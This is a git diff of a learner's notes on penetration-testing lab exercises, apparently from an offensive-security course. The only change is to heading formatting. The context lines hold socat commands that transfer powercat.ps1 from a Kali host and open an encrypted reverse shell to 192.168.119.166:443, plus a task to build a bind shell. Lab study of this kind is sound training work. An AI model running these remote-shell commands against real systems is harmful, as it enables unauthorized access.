@@ -1,6 +1,6 @@
 
 
-###### 4.2.4.1.1
+# 4.2.4.1.1
 Use socat to transfer powercat.ps1 from your Kali machine to your Windows system. Keep the file on your system for use in the next section.  
   
   
@@ -16,7 +16,7 @@ socat TCP4:192.168.119.166:443 file:powercat.ps1,create
 
 
 
-###### 4.2.4.1.2
+# 4.2.4.1.2
 Use socat to create an encrypted reverse shell from your Windows system to your Kali machine.  
   
 Linux - Create self-signed SSL cert & Send to Windows:  
@@ -60,7 +60,7 @@ socat - OPENSSL:192.168.119.166:443,verify=0
 
   
   
-###### 4.2.4.1.3 
+# 4.2.4.1.3 
 Create an encrypted bind shell on your Windows system. Try to connect to it from Kali without encryption. Does it still work? **- No**  
   
 Windows - Establish encrypted listener:  
